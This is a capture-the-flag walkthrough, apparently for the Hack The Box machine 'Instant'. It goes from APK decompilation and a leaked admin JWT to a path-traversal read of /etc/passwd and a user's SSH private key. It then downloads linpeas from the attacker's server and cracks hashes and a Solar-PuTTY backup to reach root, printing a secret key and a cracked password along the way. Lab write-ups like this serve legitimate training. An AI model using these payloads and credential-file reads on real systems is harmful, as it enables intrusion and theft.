Let's scan the machine with nmap.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have an Http Server running at port 80. 
In order to get access, we need to modify the `/etc/hosts` file, or use a tool like Burpsuite to change the Host header of the request to `Host: instant.htb`

```bash
# access the endpoint from the browser
sudo echo "10.10.11.37  instant.htb" >> /etc/hosts
```
The website is promoting an android application that offers customers cross-platform transactions. 

![alt](lab1.png)

We searched the website for any interesting endpoint that could be vulnerable to SQL injection or XSS vulnerability, but unfortunately there is nothing notable.

```bash
# Also used directory bruteforcing just to be sure
gobuster dir -u http://instant.htb/ -w /usr/share/worldlist/dirb/big.txt

# Then proceed with subdomain bruteforcing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://instant.htb/ -H "Host: FUZZ.instant.htb"
```

Nothing... so let's download and examine the application by requesting `http://instant.htb/downloads/instant.apk` or by simply clicking the "Download Now" button.

First, we can use the `apkurlgrep` tool ([Github Repo](https://github.com/ndelphit/apkurlgrep)) to extract endpoints from the apk.

```bash
apkurlgrep -a instant.apk >> apkUrls.txt
```

![alt](lab2.png)

So we found a subdomain, `mywalletv1.instant.htb` that has some api endpoints for authentication and user activities.

Modify the `/etc/hosts` file accordingly and now let's try to access these endpoints while proxying the traffic with Burpsuite. 

![alt](lab3.png)

We get a `201` response with 'Unauthorized' message. We don't know a lot about the api yet, so we should see if we can find out more by the application.

Let's use a decompiler, like `jadx` to inspect the code. In order to launch the GUI version, navigate to the bin directory and execute `jadx-gui`. Now open the `instant.apk` file. 

Right off the bat we can see at `AdminActivities` class, a private function `TestAdminAuthorization` that constructs a new http request to `/api/v1/view/profile` and adds a header, `Authorization: <JWT Token>`
![alt](lab4.png)

We may be able to use this token to authenticate as Admin.

![alt](lab5.png)
![alt](lab6.png)

Great! We are authorized to view the profile of admin.

Even though we got some useful information, something is missing. Continue with enumeration of `inspect.apk`.

We can unzip an Android `.apk`, exactly like a `.zip` file, but in this case to examine in more detail we will use `apktool`.

```bash
apktool d instant.apk -o instant-app
```

One thing we can check right away, is the `res/xml/network_security_config.xml` file, which is used to specify security details like certificate pins and HTTP traffic settings. An example is allowing HTTP traffic for specific domains. ([HackTricks - Basic understanding of the application](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting#basic-understanding-of-the-application-manifest.xml-strings.xml))

```bash
cat instant-app/res/xml/network_security_config.xml

# results
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

We got another subdomain, `swagger-ui.instant.htb`, which is the UI version of Swagger (framework that allows developers to create interactive, machine and human-readable API documentation).

![alt](lab7.png)

Here we can see all the endpoints of the Api. Something we didn't know is that there is logging system, which is interesting.

There is a `/admin/read/log` endpoint which is locked. In order to access it we need to provide the authorization token along with the file name.

![alt](lab8.png)
![alt](lab9.png)

Let's try to put a path like, `../../../etc/passwd`.

![alt](lab10.png)
![alt](lab11.png)

We just found a LFI (Local File Inclusion) vulnerability.

We can leverage this to find the private ssh key. Usually it is at `.ssh/id_rsa`. 

![alt](lab12.png)

And we got the private key. Now we can save it to a file locally and connect with ssh to the machine.

```bash
vim private_key #Save private key to a file

chmod 600 private_key #Give appropriate permissions

ssh -i private_key shirohige@10.10.11.37 #Connect with ssh
```

Nice, we got a foothold to the machine.

First examined `sudo -l`, `capabilities`, `crontab`, but nothing interesting popped up, so before proceeding into manual enumeration of the system, we could run `linpeas.sh` to see if we can find anything usefull.

```bash
python3 -m http.server 1234 #Start a server in kali

wget http://<ip_address>:1234/linpeas.sh #Download linpeas to the machine
```

Now we can execute the script. Some promising results are:
- Found a `SECRET_KEY` (`VeryStrongS3cretKeyY0uC4NTGET`) variable at `.env`
- Possible `snapd` vulnerability, if it is `2.37.1` or newer
- Possible usefull file at `opt/backups/Solar-PuTTY/sessions-backup.dat`
- Encrypted passwords for Users in Database (sqlite is used)
![alt](lab13.png)
<br>

Unfortunately, the `SECRET_KEY` password does't work for root and `snapd` version is way higher than `2.37.1`. So let's look into the `instant.db` file.

```bash
# Transfer instant.db with http.server or scp to Kali Linux
# Then connect to the database and examine
sqlite3 instant.db

sqlite3> .tables #see if there is any table with credentials
sqlite3> .schema wallet_users
sqlite3> .mode column #change output to column representation (easier to read)
sqlite3> select * from wallet_users;
```
![alt](lab14.png)
![alt](lab15.png)
![alt](lab16.png)

We have three passwords to crack.

Let's try to decrypt the `pbkdf2:sha256` password. By googling `pbkdf2:sha256 cracker site: github.com` we can find [Werkzeug-Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker) tool.

We got nothing by brute-forcing the admin password, but we found that the password for `shirohige` is `estrella`.

```bash
python3 werkzeug_cracker.py -p hash.txt -w /usr/share/wordlists/dirb/others/best1050.txt
```
Again we can't `su root` with this password.

Next is to check the `opt/backups/Solar-PuTTY/sessions-backup.dat` file. `Solar-Putty` is an application that allows its users to connect remotely with `ssh`, `telnet` etc to the server (despite their OS). There might be credentials into that backup file.

By searching `sessions backup solar putty file linux site: github.com` we found [SolarPuttyDecrypt](https://github.com/VoidSec/SolarPuttyDecrypt), a tool to decrypt `sessions-backup.dat`.

![alt](lab17.png)
 
After running the script in a Windows VM we found the credentials for root user.
